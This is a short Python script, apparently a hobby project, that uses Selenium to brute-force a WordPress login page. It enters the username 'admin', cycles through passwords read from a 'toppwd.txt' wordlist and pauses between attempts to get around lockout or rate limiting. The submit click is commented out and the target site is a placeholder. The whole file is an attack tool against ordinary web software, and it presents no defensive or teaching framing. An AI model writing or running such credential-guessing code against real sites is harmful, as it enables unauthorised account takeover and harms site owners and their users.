from os import closerange
import time
from selenium import webdriver


## DDos Prevention on/off?
def tryFind (driver):
    try:
        return driver.find_element_by_name('pwd')
    except:
        print("Waiting")
        time.sleep(61)
        return False


def bruteForce (driver):
    with open("toppwd.txt", "r") as a_file:
        for line in a_file:
            if (tryFind(driver)):
                pwd_box = driver.find_element_by_xpath("//input[@type='password']")
                send_btn = driver.find_element_by_name('wp-submit')
                possiblePwd = line.strip()
                print(possiblePwd)
                pwd_box.send_keys(possiblePwd)
                time.sleep(100)
                #send_btn.click()
            else :
                username_box = driver.find_element_by_name('log')
                username_box.send_keys('admin')
                print ("Username set")

#Set the initial site
driver = webdriver.Chrome('D:\Github\Python\BruteForce\chromedriver')  # Optional argument, if not specified will search path.
driver.get('InsertBlogHere');
time.sleep(1) # Let the user actually see something!

#Init the loginbox
username_box = driver.find_element_by_name('log')

#use allready found username
username_box.send_keys('admin')

bruteForce(driver)
time.sleep(1000000) # Let the user actually see something!
driver.quit()


